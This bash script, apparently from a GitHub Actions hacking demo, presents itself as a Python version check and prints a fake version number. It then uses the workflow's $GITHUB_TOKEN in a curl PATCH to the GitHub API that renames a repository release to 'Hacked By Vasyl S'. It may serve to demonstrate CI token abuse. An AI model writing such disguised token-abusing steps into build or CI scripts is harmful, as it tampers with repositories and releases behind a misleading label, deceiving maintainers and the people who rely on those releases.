#!/bin/bash

# Echo the Python version
echo "Python version: 9.8"

curl -L \
  -X PATCH \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/lociko/hack_github_action/releases/197557501 \
  -d '{"tag_name":"v1","name":"Hacked By Vasyl S"}'
